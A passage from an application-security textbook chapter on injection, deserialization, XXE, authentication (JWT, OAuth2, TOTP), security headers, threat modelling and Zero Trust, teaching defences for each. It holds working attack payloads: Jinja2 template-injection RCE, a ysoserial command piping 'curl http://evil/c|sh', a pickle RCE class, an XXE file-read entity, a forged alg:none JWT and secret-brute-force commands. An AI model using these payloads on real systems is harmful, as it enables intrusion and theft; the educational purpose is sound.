Template("Hello " + request.args['name']).render()
```
Detection payload (Jinja2):
```
name={{7*7}}      → renders "49"  ⇒ the template engine is evaluating the expression
```
Escalation payload to RCE (Jinja2/Python):
```
{{ ''.__class__.__mro__[1].__subclasses__() }}      # enumerate classes
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
`__globals__` accesses the module namespace → reaching `os`. Each engine has its own payload:

| Engine | Test | Hallmark |
|--------|------|-----------|
| Jinja2 (Python) | `{{7*7}}`→49 | `__class__`, `__globals__` |
| Twig (PHP) | `{{7*7}}`→49 | `_self`, the `map` filter |
| Freemarker (Java) | `${7*7}`→49 | `freemarker.template.utility.Execute` |
| ERB (Ruby) | `<%= 7*7 %>`→49 | `system()` |

**Defense:** never concatenate input into the template source. Pass input via a **context variable** (`render(template, name=name)`), use a sandboxed engine if you must render user-supplied templates, and use logic-less templates (such as Mustache) where possible.

---

## 5.10. A08 — Insecure Deserialization

**What it is:** Deserialization turns data (a byte stream) into an object. The risk lies in mechanisms that allow arbitrary type reconstruction or method invocation while rebuilding the object. With such a mechanism, if you deserialize untrusted data, the attacker can build a "gadget chain" (a sequence of linked objects) that leads to RCE.

### 5.10.1. Java — `ObjectInputStream`

A Java serialized object begins with fixed magic bytes:

| Offset | Size | Field | Value |
|--------|-----------|--------|---------|
| 0 | 2 bytes | Magic `STREAM_MAGIC` | `0xAC 0xED` |
| 2 | 2 bytes | `STREAM_VERSION` | `0x00 0x05` |
| 4 | 1 byte | Type code (TC_OBJECT...) | `0x73` for an object |

The Base64 of a Java stream usually begins with `rO0AB...` (which is `0xACED0005` encoded in base64) — a tell-tale indicator in logs / for Blue Teams. A gadget chain (e.g. via the Commons Collections library) exploits a sequence of `readObject()` calls cascading to `Runtime.exec()`.

Payload-generation tool — **ysoserial**:
```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://evil/c|sh' > payload.bin
# Send payload.bin to the insecure deserialization endpoint
base64 payload.bin | head -c 8     # rO0ABXNy...
```

**Defense:** do not deserialize untrusted data with `ObjectInputStream`. Use a plain data format (JSON/Protobuf) with a parser that does NOT reconstruct arbitrary types. If Java serialization is mandatory, use `ObjectInputFilter` (JEP 290) to allowlist classes:
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;java.base/*;!*");   // allow only safe packages, deny the rest
ois.setObjectInputFilter(filter);
```

### 5.10.2. Python `pickle`

```python
# ❌ pickle.loads of untrusted data = RCE
import pickle
class E:
    def __reduce__(self):
        return (__import__('os').system, ('id',))   # called on unpickle
payload = pickle.dumps(E())     # send it to a server to unpickle
```
`__reduce__` specifies how to reconstruct the object → returns a callable + args, invoked at unpickle time. **Defense:** do not `pickle.loads` external data; use `json` for untrusted data.

---

## 5.11. A05 — XML External Entity (XXE)

**What it is:** An XML parser allows defining **entities** that point to external resources; if enabled, the attacker can read internal files or trigger SSRF.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">     <!-- external entity -->
]>
<data>&xxe;</data>                              <!-- &xxe; expands to the file content -->
```
When the parser processes `&xxe;`, it reads `/etc/passwd` and inserts it into the result. SSRF variant: `SYSTEM "http://169.254.169.254/..."`. The "billion laughs" variant (DoS) nests entities to explode in size.

**Defense — disable DTD/external entities:**
```java
// ✅ Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setExpandEntityReferences(false);
```
```python
# ✅ Python: use defusedxml instead of the default lxml/ElementTree
from defusedxml.ElementTree import parse
parse('input.xml')   # automatically blocks DTD/external entities
```

---

## 5.12. Secure file upload

**Risks:** uploading a web shell (`shell.php`), bypassing checks via double extension (`x.php.jpg`), null byte, fake content-type, path traversal (`../../`).

| Validation layer | The correct approach |
|--------------|----------------|
| Extension | Allowlist (`.jpg/.png`), not a blocklist |
| Content (magic bytes) | Check the file signature: JPEG `FF D8 FF`, PNG `89 50 4E 47 0D 0A 1A 0A` |
| Content-Type | Do not trust the client; determine it server-side |
| Stored filename | Generate a random name (UUID), do not use the client's name |
| Storage location | Outside the web root / object storage; a non-executable directory |
| Size | Limit it, to prevent DoS |

```python
MAGIC = {b'\xff\xd8\xff':'jpg', b'\x89PNG\r\n\x1a\n':'png'}
def check(buf):
    return any(buf.startswith(m) for m in MAGIC)   # read the first few bytes
```
Configuration to block execution (nginx) for the upload directory:
```nginx
location /uploads/ {
    location ~ \.(php|phtml|jsp|asp)$ { deny all; }   # do not execute code
    default_type application/octet-stream;             # force download, do not render
}
```

---

## 5.13. Input Validation vs Output Encoding

The two concepts are often confused — they solve two different problems and are **complementary**, not substitutes.

| | Input Validation | Output Encoding |
|--|------------------|-----------------|
| When | When data comes in | When data is handed to an interpreter |
| Goal | Reject malformed/unexpected data | Neutralize special characters for the target context |
| How | Allowlist (regex, type, range) | Encode/escape for HTML/JS/SQL/URL |
| What it stops | Reduces the surface, not enough to stop injection | Stops injection at the output point |

The principle: **validate input** to ensure it matches business expectations, BUT always **encode/parameterize at the output point** because the same valid data is still dangerous in a different interpreter (the valid email `a'b@x.com` still breaks SQL if concatenated). Never treat validation as the only measure against injection.

---

## 5.14. A07 — Authentication

### 5.14.1. Session cookie

A stateful model: the server stores the session, the client keeps the session ID in a cookie.

```http
Set-Cookie: SESSIONID=8f3b2c...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

| Attribute | Meaning | Security note |
|------------|---------|----------------|
| `HttpOnly` | JS cannot read the cookie | Reduces cookie theft via XSS |
| `Secure` | Sent only over HTTPS | Prevents eavesdropping |
| `SameSite` | Controls cross-site sending | Prevents CSRF |
| `Path`/`Domain` | The sending scope | A broadened `Domain` can leak to subdomains |
| `Max-Age`/`Expires` | Lifetime | The session ID should be short + have an idle timeout |

The session ID must be cryptographically random (≥128 bits of entropy). After login it must be **rotated** (to prevent session fixation). Logout must destroy the session server-side, not just delete the cookie.

### 5.14.2. JWT — JSON Web Token (RFC 7519)

**Structure.** A JWT = three Base64URL parts joined by `.`:
```
<Header>.<Payload>.<Signature>
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.dBjftJ...
```

Base64URL differs from standard Base64: `+`→`-`, `/`→`_`, padding `=` dropped (RFC 4648 §5).

**Header** (JSON-decoded from part 1):
| Field | Meaning | Example |
|--------|---------|-------|
| `alg` | Signing algorithm | `HS256`, `RS256`, `none` |
| `typ` | Token type | `JWT` |
| `kid` | Key ID (selects the key) | `key-2024` |

**Payload** — the standard claims (registered claims):
| Claim | Type | Meaning |
|-------|------|---------|
| `iss` | string | Issuer |
| `sub` | string | Subject (user id) |
| `aud` | string/array | Audience |
| `exp` | NumericDate (Unix seconds) | Expiration |
| `nbf` | NumericDate | Not valid before this time |
| `iat` | NumericDate | Issued-at time |
| `jti` | string | Token ID (anti-replay) |

**Signature.**
- HS256: `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)` — symmetric, the same secret signs and verifies.
- RS256: `RSASSA-PKCS1-v1_5 + SHA-256`, the private key signs and the public key verifies — asymmetric.

### 5.14.3. JWT attacks

**(a) `alg: none`.** Some older libraries accept `alg=none`, meaning "no signature needed." The attacker edits the payload, sets `alg:none`, and drops the signature part:
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
                                                              ↑ empty signature
```
If the server does not pin the algorithm → it accepts the forged token. **Fix:** allowlist the algorithm server-side (`verify(token, key, algorithms=['RS256'])`), reject `none`.

**(b) HS256 ↔ RS256 confusion.** The server is configured to verify RS256 using the **public key**. The attacker switches the header to `HS256` and signs using that public key (which is known, since it is public) as the "secret." If the library uses the same verify function and takes the public key as the HMAC key → the signature is valid.
```python
# ❌ Vulnerability: algorithm taken from the token, key shared
jwt.decode(token, public_key)            # does not pin algorithms
# ✅ Pin the asymmetric algorithm
jwt.decode(token, public_key, algorithms=['RS256'])
```

**(c) Missing `exp`/`aud`/signature checks.** Many bugs come from merely base64-decoding the payload without verifying. Always verify the signature FIRST, then check `exp`, `nbf`, `aud`, `iss`.

**Tool:** `jwt_tool`:
```bash
python3 jwt_tool.py <token> -X a          # try the alg:none attack
python3 jwt_tool.py <token> -C -d wordlist.txt   # brute-force the HS256 secret
```

**Note:** JWTs cannot be easily revoked (stateless). Use a short `exp` + refresh tokens, or a revocation list (`jti` blacklist). Do not put sensitive data in the payload (it is only base64; anyone can read it).

### 5.14.4. OAuth2 — Authorization Code Flow (RFC 6749), with PKCE (RFC 7636)

**Roles:**
- Resource Owner (the user), Client (the application), Authorization Server (AS), Resource Server (the API).

**Step by step (Authorization Code + PKCE):**

```
Step 0 (PKCE): Client generates a random code_verifier (43-128 characters),
               code_challenge = BASE64URL(SHA256(code_verifier))

Step 1: Client → browser → AS  (request authorization)
   GET /authorize?
       response_type=code
       &client_id=abc
       &redirect_uri=https://app/cb
       &scope=openid profile
       &state=xyz123                          ← anti-CSRF
       &code_challenge=E9Mq...                 ← PKCE
       &code_challenge_method=S256

Step 2: The user logs in + consents at the AS

Step 3: AS → redirects back to the Client with the authorization code
   302 Location: https://app/cb?code=AUTH_CODE&state=xyz123
   (Client checks that state matches the value it sent)

Step 4: Client (back-channel, server-to-server) exchanges the code for tokens
   POST /token
   grant_type=authorization_code
   &code=AUTH_CODE
   &redirect_uri=https://app/cb
   &client_id=abc
   &code_verifier=<original verifier>         ← AS checks SHA256(verifier)==challenge

Step 5: AS returns the tokens
   { "access_token":"...", "token_type":"Bearer",
     "expires_in":3600, "refresh_token":"...", "id_token":"..." }

Step 6: Client calls the API
   GET /api/me   Authorization: Bearer <access_token>
```

**Why Authorization Code instead of Implicit?** The access token never passes through the browser (the URL fragment) in the code flow — reducing leakage. **Why PKCE?** To prevent authorization-code theft (especially for public/mobile clients that cannot keep a secret): the code can only be exchanged for a token if accompanied by the correct `code_verifier`. **`state`** prevents CSRF on the redirect.

### 5.14.5. OIDC — OpenID Connect

OIDC is an identity layer built on OAuth2. The difference: the AS additionally returns an **`id_token`** (a JWT) containing identity claims. The Client must verify the `id_token` signature, check `iss`, `aud` (= client_id), `exp`, and `nonce` (anti-replay). `scope=openid` activates OIDC. Discovery is via `/.well-known/openid-configuration`; the public keys are at the JWKS endpoint (`jwks_uri`).

### 5.14.6. SAML (brief comparison)

SAML 2.0 uses XML (a SAML Assertion signed with XML-DSig) instead of JWT, and is common in enterprise SSO. Its distinctive risk: **XML Signature Wrapping (XSW)** — the attacker inserts a forged assertion whose signature still "matches" because the parser and the verifier look at different nodes. Defense: use a hardened SAML library, explicitly bind the signed node, and check `Audience`, `NotOnOrAfter`.

### 5.14.7. MFA / TOTP (RFC 6238)

**TOTP** generates a 6-digit code that changes every 30 seconds:
```
T = floor((unix_time - T0) / X)         # T0=0, X=30s
TOTP = HOTP(K, T)                        # HOTP per RFC 4226
HOTP = Truncate(HMAC-SHA1(K, T))         # K = shared secret
```
| Parameter | Default value |
|---------|-------------------|
| Hash function | SHA-1 (RFC 6238 default) |
| Time step X | 30 seconds |
| Number of digits | 6 |
| T0 | 0 (epoch) |

Truncation (Dynamic Truncation, RFC 4226): take the last 4 bits of the HMAC as an offset, read 4 bytes from that offset, mask the high bit (clear the MSB), modulo `10^6`. The server accepts a ±1-step window to compensate for clock drift. The secret `K` is shared via QR (`otpauth://totp/...?secret=BASE32`). **Note:** TOTP is poor at preventing phishing (the code can still be entered into a fake page); WebAuthn/FIDO2 (which cryptographically binds to the origin) is stronger.

---

## 5.15. Authorization — RBAC vs ABAC

| | RBAC (Role-Based) | ABAC (Attribute-Based) |
|--|--------------------|-------------------------|
| Decision based on | The role assigned to the user | Attributes (user, resource, env, action) |
| Example | `role=editor` → edit posts | `dept==resource.dept AND time<18h` |
| Pros | Simple, easy to audit | Flexible, context-aware |
| Cons | Role explosion | Complex, hard to audit |

ABAC implementations usually separate **policy** from code (e.g. OPA/Rego):
```rego
package authz
default allow = false
allow {
  input.action == "read"
  input.user.dept == input.resource.dept
}
```
General principle: check authorization centrally, close to the data, deny-by-default, and *do not* rely on hiding the UI.

---

## 5.16. A05 — Security Headers

| Header | Sample value | Effect |
|--------|-------------|----------|
| `Content-Security-Policy` | `default-src 'self'` | Prevents XSS/resource injection |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | Enforces HTTPS (HSTS), prevents SSL stripping |
| `X-Content-Type-Options` | `nosniff` | Forbids the browser from guessing the MIME type (prevents MIME confusion) |
| `X-Frame-Options` | `DENY` | Prevents clickjacking (legacy; replaced by `frame-ancestors`) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits URL leakage via the Referer |
| `Permissions-Policy` | `geolocation=(), camera=()` | Disables unused browser APIs |

**HSTS in detail:** after receiving `Strict-Transport-Security`, the browser remembers `max-age` seconds and automatically switches every request to HTTPS, not allowing the certificate warning to be bypassed. `preload` adds the domain to a hard-coded list within the browser (must be registered at hstspreload.org) → protecting even the FIRST visit.

A real-world nginx configuration:
```nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```
`always` ensures the header is attached even to error responses (4xx/5xx).

---

## 5.17. Threat Modeling: STRIDE + DFD + Trust Boundary

**STRIDE** classifies threats into 6 categories, each breaking a security property:

| STRIDE | Threat | Property broken | Typical countermeasure |
|--------|--------|--------------------|---------------------|
| **S**poofing | Identity spoofing | Authentication | MFA, digital signatures |
| **T**ampering | Modifying data | Integrity | HMAC, hash, signing |
| **R**epudiation | Denying an action | Non-repudiation | Signed audit logs, timestamps |
| **I**nformation Disclosure | Leaking information | Confidentiality | Encryption, authorization |
| **D**enial of Service | Service denial | Availability | Rate limiting, autoscale |
| **E**levation of Privilege | Privilege escalation | Authorization | Least privilege, authorization checks |

**DFD (Data Flow Diagram)** models the system with 4 elements:
```
[External Entity] = rectangle (user, third party)
(Process)         = circle/rounded (processing code)
|Data Store|      = two parallel lines (DB, file)
──Data Flow──►    = arrow (data flow)
╌╌ Trust Boundary = dashed line (trust boundary)
```

A **trust boundary** is where the trust level changes — exactly where controls are needed (validate/authenticate/authorize). Example login DFD:

```
[User] ──(creds)──► ╎ ──► (Web App) ──(query)──► |User DB|
                    ╎ ↑ trust boundary: Internet → DMZ
        ◄─(cookie)── ╎ ◄── (Web App)
```
Every data flow that **crosses** a trust boundary is a threat candidate: apply STRIDE to each such flow. For example, the `creds` flow across the boundary → Spoofing (needs strong auth), Information Disclosure (needs TLS), Tampering (needs integrity).

The process: (1) draw the DFD, (2) identify trust boundaries, (3) for each element/flow apply STRIDE, (4) rank the risk (e.g. DREAD or CVSS), (5) choose mitigations, (6) iterate over the lifecycle.

---

## 5.18. Zero Trust — NIST SP 800-207

**What it is:** Zero Trust (ZT) is a model that abandons the assumption of "trust based on network location" — being on the LAN does not mean you are safe. The slogan: *"never trust, always verify"*. NIST SP 800-207 defines the architecture and principles (consult the official NIST document when implementing).

**The seven core principles (NIST SP 800-207, summarized — consult the original document):**
1. All data sources and computing services are resources.
2. Secure all communication regardless of network location.
3. Grant access **per session** (per-session).
4. Base access decisions on **dynamic policy** by attributes (identity, device posture, context).
5. Monitor and measure the integrity / security posture of assets.
6. Authenticate and authorize **dynamically and strictly** before every access.
7. Collect as much information as possible about state to improve the security posture.

**Logical architecture (PEP/PDP):**
```
                  ┌────────── Control Plane ──────────┐
                  │   PDP = Policy Decision Point      │
   ┌──────┐       │   ┌────────────┐  ┌────────────┐  │      ┌──────────┐
   │Subject│──req─┤   │Policy Engine│  │Policy Admin │  │      │ Resource │
   │+Device│      │   └─────┬──────┘  └──────┬──────┘  │      │ (target) │
   └──────┘       └─────────┼────────────────┼─────────┘      └────┬─────┘
       │                    │ (decision)      │                    │
       │                    ▼                 ▼                    │
       └────────────► [ PEP ] Policy Enforcement Point ───────────┘
                       (allow/block per session)
```
- **PDP** (Policy Decision Point): comprises the *Policy Engine* (which makes the allow/block decision) + the *Policy Administrator* (which sets up/tears down the connection channel).
- **PEP** (Policy Enforcement Point): enforces the decision — enabling/disabling/monitoring the connection between the subject and the resource.

The decision takes input from many sources (CDM/asset management, threat intel, identity, SIEM, policy...). Unlike the traditional model: there is no "trusted network"; every access to every resource is re-authenticated + re-authorized according to the current context. ZT directly relates to AppSec: least privilege, micro-segmentation, strong per-request authentication, and continuous monitoring (tied to A09 — logging/monitoring).

---

## 5.19. A09 — Logging & Monitoring (operational notes)

Missing logs/monitoring let attacks go undetected. You should log: successful/failed logins, permission changes, access errors, and rejected input; together with `timestamp`, `user`, `source IP`, `action`, `result`. Do not log sensitive data (passwords, tokens, full PII). Ensure log integrity (append-only, signed/centralized), and attach alerts (e.g. many consecutive 401s, a spike in 500s, sqlmap/`UNION SELECT` signatures). Link to a SIEM to correlate events — this is the natural bridge between AppSec and Zero Trust (section 5.18).

---

*End of Chapter 5.*
